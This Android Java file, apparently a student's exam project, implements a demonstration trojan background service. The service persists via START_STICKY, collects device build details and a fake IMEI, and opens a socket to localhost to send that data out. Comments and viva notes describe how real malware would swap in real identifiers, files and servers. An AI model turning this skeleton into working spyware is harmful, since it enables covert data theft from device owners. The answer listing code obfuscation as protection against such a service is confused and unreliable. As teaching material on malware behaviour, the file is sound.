package com.example.malware;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Build;
import android.util.Log;

import java.io.*;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * TrojanService - Malicious Background Service
 * 
 * EDUCATIONAL PURPOSE ONLY
 * 
 * This service demonstrates how malware can:
 * 1. Run invisibly in the background
 * 2. Perform actions without user knowledge
 * 3. Simulate data exfiltration
 * 4. Persist across app restarts
 * 
 * In this controlled educational environment:
 * - NO real data is stolen
 * - NO real damage is caused
 * - Service only logs to local file
 * - Network connection to localhost only (will fail safely)
 */
public class TrojanService extends Service {
    private static final String TAG = "TrojanService";
    private static final String LOG_FILE = "trojan_activity.log";
    private static final int EXFIL_PORT = 8888;
    private static final String EXFIL_HOST = "127.0.0.1"; // localhost only
    
    /**
     * Called when service is started
     * 
     * This is where the malicious action begins
     * In real malware, this would perform actual attacks
     * In this educational version, we simulate only
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "=== MALICIOUS SERVICE STARTED ===");
        logActivity("Service started at " + new Date());
        
        // Run in separate thread to avoid blocking main thread
        new Thread(() -> {
            try {
                // Small delay to simulate real-world behavior
                Thread.sleep(2000);
                
                // Perform simulated malicious action
                performExfiltration();
                
            } catch (InterruptedException e) {
                Log.e(TAG, "Thread interrupted: " + e.getMessage());
                logActivity("Error: " + e.getMessage());
            }
        }).start();
        
        // START_STICKY means service will be restarted if killed
        // This makes it persistent (harder to remove)
        return START_STICKY;
    }
    
    /**
     * Performs simulated data exfiltration
     * 
     * In real malware: Would upload real data to attacker's server
     * In this educational version: Only connects to localhost and logs action
     */
    private void performExfiltration() {
        Log.d(TAG, "Starting data exfiltration simulation...");
        logActivity("Exfiltration attempt initiated");
        
        try {
            // Gather simulated device information
            String deviceInfo = gatherDeviceInfo();
            
            // Log what would be sent
            Log.d(TAG, "Device info to send: " + deviceInfo);
            logActivity("Device info gathered: " + deviceInfo.length() + " bytes");
            
            // Try to connect to localhost server (will fail, but proves attempt)
            Log.d(TAG, "Attempting connection to " + EXFIL_HOST + ":" + EXFIL_PORT);
            logActivity("Attempting connection to " + EXFIL_HOST + ":" + EXFIL_PORT);
            
            Socket socket = new Socket(EXFIL_HOST, EXFIL_PORT);
            
            // If connection succeeds (it won't in lab), write data
            OutputStream out = socket.getOutputStream();
            out.write(("EXFIL_START\n").getBytes());
            out.write(deviceInfo.getBytes());
            out.write(("EXFIL_END\n").getBytes());
            out.flush();
            
            Log.d(TAG, "Data sent successfully!");
            logActivity("Data exfiltration successful");
            
            socket.close();
            
        } catch (Exception e) {
            // Connection fails (expected, no server running)
            Log.d(TAG, "Exfiltration attempt failed (expected): " + e.getMessage());
            logActivity("Exfiltration failed (expected - no server): " + e.getMessage());
            
            // In real attack, might retry or try alternate methods
            // In education version, just log and continue
        }
        
        Log.d(TAG, "Exfiltration attempt complete");
        logActivity("Exfiltration attempt complete");
    }
    
    /**
     * Gathers SIMULATED device information
     * 
     * Does NOT access:
     * - Real IMEI
     * - Real phone numbers
     * - Real contacts
     * - Real files
     * - Real user data
     * 
     * Only gathers public device build information
     */
    private String gatherDeviceInfo() {
        StringBuilder info = new StringBuilder();
        
        info.append("=== SIMULATED DEVICE INFORMATION (EDUCATIONAL ONLY) ===\n");
        info.append("Timestamp: ").append(new Date()).append("\n");
        info.append("Device: ").append(Build.DEVICE).append("\n");
        info.append("Model: ").append(Build.MODEL).append("\n");
        info.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
        info.append("Android Version: ").append(Build.VERSION.RELEASE).append("\n");
        info.append("API Level: ").append(Build.VERSION.SDK_INT).append("\n");
        info.append("Build ID: ").append(Build.ID).append("\n");
        info.append("Build Type: ").append(Build.TYPE).append("\n");
        
        // Generate FAKE IMEI (not real device identifier)
        info.append("Simulated IMEI: ").append(generateFakeIMEI()).append("\n");
        
        // Note to examiners
        info.append("\nNote: This is simulated data for educational purposes.\n");
        info.append("No real user data is included.\n");
        
        String result = info.toString();
        Log.d(TAG, "Device info gathered: " + result.length() + " bytes");
        return result;
    }
    
    /**
     * Generates a FAKE IMEI number
     * 
     * NOT the real device IMEI
     * This is for demonstration only
     * Real malware would get actual IMEI: TelephonyManager.getDeviceId()
     */
    private String generateFakeIMEI() {
        return "SIMULATED-IMEI-" + System.currentTimeMillis();
    }
    
    /**
     * Logs activity to file for proof of execution
     * 
     * This allows us to prove in the viva exam that:
     * 1. Service was actually created and started
     * 2. Service executed the malicious code
     * 3. All activities were logged
     */
    private void logActivity(String message) {
        try {
            File logDir = getExternalFilesDir(null);
            if (logDir != null && logDir.exists()) {
                File logFile = new File(logDir, LOG_FILE);
                
                // Append mode (true = append to existing)
                FileWriter fw = new FileWriter(logFile, true);
                
                // Format: [HH:MM:SS] message
                String timestamp = new SimpleDateFormat("HH:mm:ss").format(new Date());
                String logMessage = "[" + timestamp + "] " + message + "\n";
                
                fw.write(logMessage);
                fw.close();
                
                Log.d(TAG, "Logged to file: " + logFile.getAbsolutePath());
            }
        } catch (IOException e) {
            Log.e(TAG, "Failed to write log: " + e.getMessage());
        }
    }
    
    /**
     * Called when service is bound
     * 
     * We don't support binding, so return null
     * This prevents other apps from binding to our service
     */
    @Override
    public IBinder onBind(Intent intent) {
        Log.d(TAG, "Service bound");
        return null;
    }
    
    /**
     * Called when service is destroyed
     */
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
        logActivity("Service destroyed");
    }
    
    /**
     * EDUCATIONAL NOTES FOR VIVA:
     * 
     * Questions you might face:
     * 
     * Q: How does this service hide from the user?
     * A: No UI, runs in background, separate process, no visible indicator
     * 
     * Q: How does it persist?
     * A: Returns START_STICKY so it restarts if killed
     * 
     * Q: Why use separate thread?
     * A: Prevents blocking main thread/ANR (Application Not Responding)
     * 
     * Q: Why localhost:8888?
     * A: Safe for education (no real connection possible)
     * 
     * Q: What happens if real server was running?
     * A: Device info would be sent (but no real data included)
     * 
     * Q: How would real malware modify this?
     * A: Replace fake IMEI with real one, access real files, use real server
     * 
     * Q: How can user detect this service?
     * A: Logcat logs, Settings > Apps, network monitor, antivirus
     * 
     * Q: How can developer prevent this?
     * A: Code obfuscation, APK signature verification, runtime integrity checks
     */
}
